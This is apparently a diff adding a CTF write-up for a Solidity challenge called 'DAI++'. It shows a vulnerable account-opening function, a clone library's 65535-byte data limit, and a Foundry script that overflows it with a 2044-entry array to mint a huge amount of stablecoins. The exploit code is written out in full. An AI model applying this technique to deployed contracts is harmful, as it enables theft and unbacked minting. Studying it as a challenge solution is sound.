@@ -324,3 +324,48 @@ contract Exploit {
     
 }
 ```
+
+### DAI++
+
+The vulnerable code is
+```solidity
+    function _openAccount(address owner, address[] calldata recoveryAddresses) private returns (Account) {
+        Account account = Account(
+            SYSTEM_CONFIGURATION.getAccountImplementation().clone(
+                abi.encodePacked(SYSTEM_CONFIGURATION, owner, recoveryAddresses.length, recoveryAddresses)
+            )
+        );
+
+        validAccounts[account] = true;
+
+        return account;
+    }
+```
+
+In the implmentation of `clone`, it says
+
+```
+    /// @notice Creates a clone proxy of the implementation contract, with immutable args
+    /// @dev data **cannot exceed 65535 bytes**, since 2 bytes are used to store the data length
+    /// @param implementation The implementation contract to clone
+    /// @param data Encoded immutable args
+    /// @return instance The address of the created clone
+```
+
+Passing in a huge `recoveryAddresses` to `openAccount` will end up overwriting slots. While I first wanted to control the `configuration` slot of an Account. So theoretically we can create an Account and overwrite the `configuration` to our evil contract, and let the evil contract return evil ETH price or collateral ratio.
+
+During testing, I found that just by passing in an array of length 2044 is enough. Did not spend more time investigating what got overwritten.
+
+```solidity
+        vm.startBroadcast();
+        address[] memory recoveryAddresses = new address[](2044);
+        Acct temp = manager.openAccount(
+            address(this),
+            recoveryAddresses
+        );
+        manager.mintStablecoins(temp, 1_000_000_000_001 ether, "test");
+        vm.stopBroadcast();
+```
+
+
+
